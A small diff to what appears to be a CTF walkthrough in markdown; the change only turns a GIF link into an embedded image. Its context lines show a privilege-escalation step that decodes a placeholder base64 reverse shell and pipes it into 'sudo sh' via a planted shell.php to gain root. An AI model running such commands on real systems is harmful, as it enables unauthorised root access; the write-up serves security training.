@@ -18,6 +18,6 @@ We now have to launch a reverse shell with `sudo` thanks to the `shell.php`:
 printf "<reverse shell en base64>" | base64 -d | sudo sh
 ```
 
-[chipi chapa](../figs/chipi-chapa.gif)
+![chipi chapa](../figs/chipi-chapa.gif)
 
 And we are root !
